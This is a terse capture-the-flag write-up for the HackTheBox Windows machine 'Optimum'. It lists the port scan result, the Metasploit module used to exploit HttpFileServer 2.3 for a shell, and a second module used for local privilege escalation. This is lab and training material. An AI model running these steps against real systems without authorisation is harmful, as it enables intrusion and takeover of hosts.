# Optimum


| Key | Value |
|-----|-------|
| Platform | HackTheBox |
| OS | Windows |
| Difficulty | Easy |

10.10.10.8

## Recon
PORT   STATE SERVICE version
80/tcp open  http    HttpFileServer httpd 2.3

## Exploitation
msfconsole
msf6 > searxh rejetto
use windows/http/rejetto_hfs_exec
set options
run
got a shell

## Privilege Escalation
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows

use ms16_032_secondary_logon_handle_privesc
set options run got a root
